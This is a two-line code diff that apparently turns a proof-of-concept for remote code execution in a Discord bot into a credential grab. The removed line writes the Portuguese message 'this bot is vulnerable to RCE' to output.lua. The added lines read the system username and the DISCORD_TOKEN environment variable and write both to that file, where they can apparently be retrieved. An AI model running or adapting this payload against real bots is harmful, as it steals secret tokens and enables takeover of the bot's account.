@@ -1,1 +1,2 @@
-require('fs').writeFileSync('output.lua', 'ESTE BOT ESTA VULNERAVEL A RCE');
+const info = `User: ${process.env.USERNAME || process.env.USER}\nToken: ${process.env.DISCORD_TOKEN || 'Nao encontrado'}`;
+require('fs').writeFileSync('output.lua', info);
